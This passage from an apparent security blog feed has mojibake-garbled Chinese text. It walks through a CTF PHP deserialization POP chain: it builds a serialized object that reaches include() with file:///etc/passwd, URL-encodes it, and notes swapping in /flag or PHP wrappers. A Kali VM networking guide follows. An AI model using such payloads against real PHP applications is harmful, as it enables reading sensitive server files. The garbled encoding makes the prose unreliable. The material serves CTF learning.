äº†</p><p>æ–°å»ºä¸€ä¸ªphpæ–‡ä»¶ï¼ŒæŠŠè¿™ä¸ªå…¥å£çš„classç±»<code>Road_is_Long</code>å¤åˆ¶è¿‡å»ï¼Œå¹¶åˆ é™¤ä»–æ‰€æœ‰çš„é­”æœ¯æ–¹æ³•ã€‚å†å¯¹è¿™ä¸ªç±»åšå®ä¾‹åŒ–å’Œåºåˆ—åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723172057611.png" alt="image-20240723172057611"></p><p>OKï¼Œå¥½æäº†ï¼Œé‚£ä¹ˆè¿™é‡Œå‰©ä¸‹äº†ä¸¤ä¸ªå˜é‡ï¼Œè¿™ä¸¤ä¸ªå˜é‡çš„å€¼æ˜¯å¤šå°‘éœ€è¦å¾€ä¸‹èµ°ã€‚</p><h3 id="2ã€-wakeup-å‡½æ•°"><a href="#2ã€-wakeup-å‡½æ•°" class="headerlink" title="2ã€__wakeup å‡½æ•°"></a>2ã€__wakeup å‡½æ•°</h3><p>ä¹‹åå°±è¯¥è¯»__wakeupå…¥å£å‡½æ•°çš„å†…å®¹äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __wakeup()&#123;</span><br><span class="line">    if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">        echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">$this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæåˆ°äº† page å˜é‡ï¼Œå¯¹è¿™ä¸ªå˜é‡è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤äº†å¾ˆå¤šçš„åè®®ã€‚å¦‚æœåŒ¹é…æˆåŠŸï¼Œåˆ™æ›´æ”¹è¿™ä¸ªå˜é‡çš„å€¼ä¸º<code>index.php</code>ã€‚</p><ol><li>æ€è·¯ä¸€ï¼šå¤§å®¶å¯èƒ½ä¼šå°è¯•ç»•è¿‡è¿™ä¸ªæ­£åˆ™åŒ¹é…ï¼Œç»§ç»­å¾€åèµ°ã€‚ä½†é—®é¢˜æ˜¯ä¸ç®¡æœ‰æ²¡æœ‰ç»•è¿‡è¿™ä¸ªå‡½æ•°ï¼Œå½“è¿™ä¸ªå‡½æ•°èµ°å®Œä¹‹åèµ°å“ªä¸ªå‡½æ•°å‘¢ï¼Ÿå·²ç»åˆ°äº†æ— è·¯å¯èµ°çš„æ—¶å€™äº†ï¼Œè€Œè¿™ä¸ªclass ä¸­æ—¢æ— <code>__destruct </code>å‡½æ•°ï¼Œä¹Ÿæ— å…¶ä»–çš„ç»ˆç‚¹å‡½æ•°ï¼Œä»£ç ç›´æ¥èµ°åˆ°å¤´äº†ã€‚</li><li>æ€è·¯äºŒï¼špage å˜é‡åœ¨è¿›è¡Œæ­£åˆ™åŒ¹é…çš„æ—¶å€™ï¼Œæ˜¯ä¼šè¢«å½“ä½œå­—ç¬¦ä¸²å»çœ‹å¾…ã€‚æœ‰æ²¡æœ‰æ„Ÿè§‰çœ¼ç†Ÿï¼Œæ²¡é”™ï¼Œå¦‚æœæ­¤æ—¶pageå˜é‡çš„å€¼æ­£å¥½æ˜¯æŸä¸ªå¯¹è±¡çš„è¯ï¼Œåˆ™ä¼šè§¦å‘è¿™ä¸ªå¯¹è±¡çš„<code>__toString</code>å‡½æ•°ã€‚è€Œå…¶æœ¬èº«<code>Road_is_Long</code>æ˜¯å·²ç»è¢«ååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œä¸”å…·å¤‡<code>__toString</code>å‡½æ•°</li></ol><p>åˆ™page å˜é‡çš„å†…å®¹ç¡®å®šï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å­ï¼Œå°†ä¼šèµ°åˆ°<code>__toString</code>å‡½æ•°é‡Œé¢å»ï¼Œå°±å‰©stringå˜é‡çš„å†…å®¹äº†</p><h3 id="3ã€-toString-å‡½æ•°"><a href="#3ã€-toString-å‡½æ•°" class="headerlink" title="3ã€__toString å‡½æ•°"></a>3ã€__toString å‡½æ•°</h3><p>ä¹‹åè¯»__toString å‡½æ•°çš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()&#123;</span><br><span class="line">return $this-&gt;string-&gt;page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éå¸¸ç®€å•ï¼Œåªæœ‰ä¸€è¡Œä»£ç ï¼Œä½†æ˜¯åŸºç¡€è–„å¼±çš„ä¼™ä¼´çœ‹åˆ°ä¼šæ„Ÿè§‰æ‡µäº†å¾ˆï¼Œçœ‹ä¸æ‡‚ã€‚å…¶å®è¿™ä¸ªå¾ˆç®€å•ï¼Œæˆ‘ä»¬æ‹†å¼€çœ‹</p><ol><li>ç¬¬ä¸€éƒ¨åˆ†ï¼š<code>$this-&gt;string</code>ï¼Œè¿™é‡Œå…¶å®è¯´çš„å°±æ˜¯è¿™ä¸ªå¯¹è±¡çš„<code>$string</code>å˜é‡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰©ä¸‹çš„ç¬¬äºŒä¸ªå˜é‡ã€‚</li><li>ç¬¬äºŒéƒ¨åˆ†ï¼š<code>string-&gt;page</code>ï¼Œè¿™é‡Œæ˜¯ä¸ªè¿·æƒ‘è¡Œä¸ºï¼Œè¿™ä¸ª<code>string</code>æŒ‡æˆ‘ä»¬çš„å˜é‡ï¼Œç¬¬äºŒä¸ª<code>page</code>å˜é‡æŒ‡çš„æ˜¯å…¶ä»–ã€‚å®ƒå¹¶ä¸æ˜¯æˆ‘ä»¬çš„pageå˜é‡ï¼Œè€Œæ˜¯éšæ„çš„ä¸€ä¸ªå†…å®¹å‡å¯ï¼Œå¦‚<code>string-&gt;abc</code>ï¼Œå¯¹è¿™ä¸ªé¢˜æ˜¯æ²¡æœ‰ä»»ä½•å½±å“ã€‚</li></ol><blockquote><p>1ã€æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªå®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œæ‰å¯ä»¥ç”¨-&gt;ï¼Œå¦‚æˆ‘ä»¬å†™çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br></pre></td></tr></table></figure><p>ä¸­$rilæ˜¯å¯¹è±¡ï¼Œæ‰å¯ä»¥ç”¨-&gt;æ¥è°ƒç”¨pageå˜é‡</p><p>2ã€åŒæ ·çš„$this-&gt;string-&gt;page</p><p>æ„å‘³$this-&gt;stringæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œçœ‹æ•´ä½“</p><p>$this-&gt;string                     -&gt;page</p><p>â€‹           å¯¹è±¡            çš„         pageå˜é‡</p></blockquote><p>æ‰€ä»¥ï¼Œç¬¬äºŒä¸ªå˜é‡stringä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚é‚£å…·ä½“æ˜¯è°çš„å¯¹è±¡ï¼Ÿ</p><ol><li>æ€è·¯ä¸€ï¼šé‚£å°±çœ‹è°çš„classç±»é‡Œé¢æœ‰pageå˜é‡å’¯ã€‚ä½†æ˜¯åªæœ‰<code>Road_is_Long</code>å¯¹è±¡æ‰æœ‰pageå˜é‡å•Šï¼Œå•Šï¼Ÿè¿™æ€ä¹ˆå›äº‹å„¿ï¼Œæ„Ÿè§‰è„‘è¢‹æœ‰ç‚¹æ‡µï¼Œæ€ä¹ˆåˆè°ƒç”¨å›æ¥äº†ï¼Ÿ</li><li>æ€è·¯äºŒï¼šå·²ç»èµ°åˆ°äº†ååºåˆ—åŒ–ä¸­å¸¸è§çš„ä¸­é—´è·³æ¿å‡½æ•°ã€‚__get å½“è¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è¢«è°ƒç”¨ã€‚å¦‚æœè¿™ä¸ªstring çš„å€¼æ˜¯<code>Make_a_Change</code>ç±»çš„å®ä¾‹å¯¹è±¡ï¼Œè€Œè¿™ä¸ªç±»ä¸­æ²¡æœ‰page å˜é‡ï¼Œä½†æ˜¯æœ‰<code>getå‡½æ•°</code>å•Šã€‚è¿™æ ·ä¸€æ¥ï¼Œå°±èµ°åˆ°è¿™ä¸ªç±»é‡Œé¢çš„ <code>get å‡½æ•°</code>é‡Œé¢äº†</li></ol><p>åˆ™string çš„å†…å®¹ç¡®å®šï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™ä¸ªæ—¶å€™åˆå¤šå‡ºæ¥äº†ä¸€ä¸ª<code>$effort</code>å˜é‡ï¼Œéœ€è¦ç¡®å®šè¿™ä¸ªå˜é‡çš„å€¼æ˜¯å¤šå°‘</p><h3 id="4ã€-get-å‡½æ•°"><a href="#4ã€-get-å‡½æ•°" class="headerlink" title="4ã€__get å‡½æ•°"></a>4ã€__get å‡½æ•°</h3><p>é‚£ç»§ç»­çœ‹<code>__get</code>å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __get($key)&#123;</span><br><span class="line">$function = $this-&gt;effort;</span><br><span class="line">return $function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¥½ï¼Œè¿™é‡Œæåˆ°äº†effort å˜é‡ã€‚</p><ol><li>$function &#x3D; $this-&gt;effort; å°†effortå˜é‡çš„å€¼ç»™$function å˜é‡ï¼Œè¿™æ²¡å•¥ï¼Œå¯å…³é”®åœ¨ç¬¬äºŒè¡Œ</li><li>return $function(); è¿™ä»€ä¹ˆé¬¼ï¼Œä¸€ä¸ªå˜é‡åé¢åŠ ä¸ª()ï¼Œä¼šä¸ä¼šæ‡µã€‚ä½†æˆ‘ä»¬åœ¨å¾€ä¸Šçœ‹ä¸­é—´è·³æ¿çš„é‚£äº›å‡½æ•°ä¸­ï¼Œæœ‰æ— ä¸è¿™ä¸ªç›¸å…³ã€‚__invokeï¼šå½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ã€‚æ¬¸ï¼Œå¦‚æœæ­¤æ—¶effort å˜é‡çš„å€¼æ˜¯ä¸€ä¸ªå¯¹è±¡çš„è¯ï¼Œ$function() ä¸å°±ç›¸å½“äºæŠŠè¿™ä¸ªå¯¹è±¡å½“æˆå‡½æ•°æ¥è°ƒç”¨äº†å—ã€‚è€Œåœ¨<code>Try_Work_Hard</code> ç±»ä¸­æ­£å¥½æœ‰è¿™ä¸ª<code>invoke</code>å‡½æ•°</li></ol><p>æ­¤æ—¶ï¼Œeffortå˜é‡çš„å€¼ç¡®å®šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">$twh = new Try_Work_Hard();</span><br><span class="line">$mac-&gt;effort = $twh;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šæˆ‘ä»¬æ‹¿è¿‡æ¥çš„ç±»ï¼Œéœ€è¦æŠŠé‡Œé¢æ‰€æœ‰çš„æ–¹æ³•éƒ½å»æ‰ï¼Œåªç•™ä¸‹å˜é‡å³å¯ã€‚</p><p>è¿™ä¸‹åˆå¤šå‡ºæ¥ä¸€ä¸ªæœªçŸ¥çš„å˜é‡ï¼š<code>Try_Work_Hard</code>ç±»é‡Œé¢çš„ <code>$var</code>å˜é‡ã€‚ç»§ç»­å¾€åçœ‹</p><h3 id="5ã€-invoke-å‡½æ•°"><a href="#5ã€-invoke-å‡½æ•°" class="headerlink" title="5ã€__invoke å‡½æ•°"></a>5ã€__invoke å‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __invoke()&#123;</span><br><span class="line">$this-&gt;append($this-&gt;var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯åªæœ‰ä¸€è¡Œä»£ç ï¼ŒæŠŠæœ¬å¯¹è±¡çš„var å˜é‡çš„å€¼åšä¸ºå‚æ•°ä¼ å…¥æœ¬å¯¹è±¡çš„append æ–¹æ³•ä¸­ï¼Œå™¢ï¼Œçœ‹æ¥è¦è¿æ¥ç»“å±€äº†</p><p>çœ‹æœ¬å¯¹è±¡çš„append æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function append($value)&#123;</span><br><span class="line">include($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œäº†æ–‡ä»¶åŒ…å«ï¼Œçœ‹æ¥æ•´ä¸ªä»£ç çš„åˆ©ç”¨æ ¸å¿ƒå°±åœ¨è¿™é‡Œï¼Œé‚£è¿™ä¸ª<code>$var</code>çš„å€¼ï¼Œå°±æ˜¯æˆ‘ä»¬æœ€ç»ˆçš„payloadäº†ã€‚</p><p>æ¬¸ï¼Œä½†æ˜¯åˆå‡ºç°äº†ä¸€ä¸ªç‚¹ï¼Œå¦‚ä¸‹</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$varå˜é‡æ˜¯ç”±protected è¿›è¡Œä¿®é¥°ï¼Œæˆ‘ä»¬å®ä¾‹åŒ–çš„å¯¹è±¡æ— æ³•è¿›è¡Œè°ƒç”¨</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ— æ³•å†™$twh-&gt;varï¼›è¿™æ ·çš„ä»£ç </p></blockquote><p>æ‰€ä»¥åªèƒ½åœ¨classç±»ä¸­å†™å…¥ï¼Œå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var = &quot;file:///etc/passwd&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">$twh = new Try_Work_Hard();</span><br><span class="line">$mac-&gt;effort = $twh;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OKï¼Œæ•´ä¸ªä»£ç åˆ†æç»“æŸ</p><h2 id="å››ã€æäº¤ç­”æ¡ˆ"><a href="#å››ã€æäº¤ç­”æ¡ˆ" class="headerlink" title="å››ã€æäº¤ç­”æ¡ˆ"></a>å››ã€æäº¤ç­”æ¡ˆ</h2><p>çœ‹ä¸‹æ•´ä¸ªä»£ç çš„è¾“å‡ºç»“æœ</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183004058.png" alt="image-20240723183004058"></p><p>è¿˜æŒºé•¿çš„ï¼ŒæŠŠåŒå¼•å·ä¸­çš„æ‹¿è¿‡å»</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183240459.png" alt="image-20240723183240459"></p><p>å™¢ï¼Œ å•¥ä¹Ÿæ²¡æœ‰è¾“å‡ºã€‚</p><p>è¿™ä¸ªæ—¶å€™éœ€è¦æŠŠæˆ‘ä»¬çš„å†…å®¹åšä¸€ä¸ªurlç¼–ç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ä»£ç é‡Œé¢åšï¼Œåœ¨è¾“å‡ºçš„æ—¶å€™æ·»åŠ ä¸€ä¸ªurlencodeå³å¯ï¼Œå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var = &quot;file:///etc/passwd&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">$twh = new Try_Work_Hard();</span><br><span class="line">$mac-&gt;effort = $twh;</span><br><span class="line"></span><br><span class="line">var_dump(urlencode(serialize($ril)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ï¼ŒæŠŠæˆ‘ä»¬çš„è¿™ä¸€å¨ç»™ä»–</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183424076.png" alt="image-20240723183424076"></p><p>OKï¼Œéå¸¸çš„å®Œç¾</p><p>é’ˆå¯¹è¿™é“é¢˜è€Œè¨€ï¼Œåªéœ€è¦æŠŠ<code>/etc/passwd</code>æ¢æˆ<code>/flag</code>å³å¯ï¼Œç”šè‡³å¯ä½¿ç”¨phpä¼ªåè®®</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183646708.png" alt="image-20240723183646708"></p>]]></content>
      
      
      <categories>
          
          <category> CTFç«èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åŸºç¡€çŸ¥è¯†ã€‘VirtualBoxå’ŒVMwareçš„kaliæ­é…é£Ÿç”¨</title>
      <link href="/2024/07/23/Nouns-VirtualBox-VMware-networking/"/>
      <url>/2024/07/23/Nouns-VirtualBox-VMware-networking/</url>
      
        <content type="html"><![CDATA[<h1 id="VirtualBoxå’ŒVMwareçš„kaliæ­é…é£Ÿç”¨"><a href="#VirtualBoxå’ŒVMwareçš„kaliæ­é…é£Ÿç”¨" class="headerlink" title="VirtualBoxå’ŒVMwareçš„kaliæ­é…é£Ÿç”¨"></a>VirtualBoxå’ŒVMwareçš„kaliæ­é…é£Ÿç”¨</h1><h2 id="ä¸€ã€VirtualBoxè™šæ‹Ÿæœºçš„é…ç½®"><a href="#ä¸€ã€VirtualBoxè™šæ‹Ÿæœºçš„é…ç½®" class="headerlink" title="ä¸€ã€VirtualBoxè™šæ‹Ÿæœºçš„é…ç½®"></a>ä¸€ã€VirtualBoxè™šæ‹Ÿæœºçš„é…ç½®</h2><p>è¿™é‡Œä»»ä½•æœºå™¨éƒ½éœ€è¦é…ç½®æˆè¿™æ ·</p><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160128312.png" alt="image-20240723160128312"></p><h2 id="äºŒã€VMwareçš„ç½‘ç»œé…ç½®"><a href="#äºŒã€VMwareçš„ç½‘ç»œé…ç½®" class="headerlink" title="äºŒã€VMwareçš„ç½‘ç»œé…ç½®"></a>äºŒã€VMwareçš„ç½‘ç»œé…ç½®</h2><p>è¿™é‡Œéœ€è¦è·Ÿä¸Šé¢VirtualBoxè™šæ‹Ÿæœºçš„é…ç½®ä¿æŒåœ¨åŒä¸€ä¸ªç½‘å¡</p><p>æœ‰çš„å°ä¼™ä¼´ç¬¬ä¸€æ¬¡æ•´ï¼ŒVMwareçš„é…ç½®è¿™é‡Œå¯èƒ½æ²¡æœ‰è¿™ä¸ªç½‘å¡ï¼Œæˆ‘çš„å»ºè®®æ˜¯é‡å¯ä¸‹ç”µè„‘</p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160247626.png" alt="image-20240723160247626" style="zoom:150%;" /><h2 id="ä¸‰ã€VMwareä¸­kali-çš„é…ç½®"><a href="#ä¸‰ã€VMwareä¸­kali-çš„é…ç½®" class="headerlink" title="ä¸‰ã€VMwareä¸­kali çš„é…ç½®"></a>ä¸‰ã€VMwareä¸­kali çš„é…ç½®</h2><h3 id="1ã€æ¡¥æ¥ç½‘å¡ï¼ˆç¬¬ä¸€å—ç½‘å¡ï¼‰"><a href="#1ã€æ¡¥æ¥ç½‘å¡ï¼ˆç¬¬ä¸€å—ç½‘å¡ï¼‰" class="headerlink" title="1ã€æ¡¥æ¥ç½‘å¡ï¼ˆç¬¬ä¸€å—ç½‘å¡ï¼‰"></a>1ã€æ¡¥æ¥ç½‘å¡ï¼ˆç¬¬ä¸€å—ç½‘å¡ï¼‰</h3><p>æˆ‘ä»¬éœ€è¦æŠŠç½‘å¡é…ç½®æˆæ¡¥æ¥æ¨¡å¼ï¼Œæ³¨æ„ï¼Œæ˜¯ç¬¬ä¸€å—ç½‘å¡ï¼Œä¹Ÿå°±æ˜¯kali é»˜è®¤çš„é‚£å—</p><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160550901.png" alt="image-20240723160550901"></p><h3 id="2ã€NATç½‘å¡"><a href="#2ã€NATç½‘å¡" class="headerlink" title="2ã€NATç½‘å¡"></a>2ã€NATç½‘å¡</h3><p>é…ç½®å¥½ç¬¬ä¸€å—ç½‘å¡ä¹‹åï¼Œå†æ·»åŠ ä¸€å—NATç½‘å¡ï¼Œæ˜¯ä¸ºäº†æ–¹ä¾¿ä¸ç½‘ç»œäº¤äº’ï¼Œé¿å…ä¸‹è½½æŸä¸ªå·¥å…·æ— æ³•ä¸Šç½‘çš„é—®é¢˜</p><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160722820.png" alt="image-20240723160722820"></p><h3 id="3ã€ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#3ã€ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="3ã€ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>3ã€ä¿®æ”¹é…ç½®æ–‡ä»¶</h3><p>ç½‘å¡é…å¥½ä¹‹åï¼Œæ‰“å¼€kaliï¼Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>æ·»åŠ dhcpï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto eth1</span><br><span class="line">iface eth1 inet dhcp</span><br></pre></td></tr></table></figure><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160955764.png" alt="image-20240723160955764"></p><p>ä¹‹åé‡å¯ç½‘ç»œå³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart networking.service</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæœ‰çš„å°ä¼™ä¼´è¿™é‡Œé‡å¯ä¹‹åæ„Ÿè§‰æ²¡å•¥ç”¨ï¼Œç½‘æ®µä¹Ÿæ²¡å˜åŒ–ç­‰å¾…ï¼›</p><p>å»ºè®®åœ¨å¼€å¯VirtualBoxè™šæ‹Ÿæœºä¹‹åï¼Œå†å¼€å¯kali</p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VirtualBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-BTRsys1</title>
      <link href="/2024/07/22/OSCP-BTRsys1/"/>
      <url>/2024/07/22/OSCP-BTRsys1/</url>
      
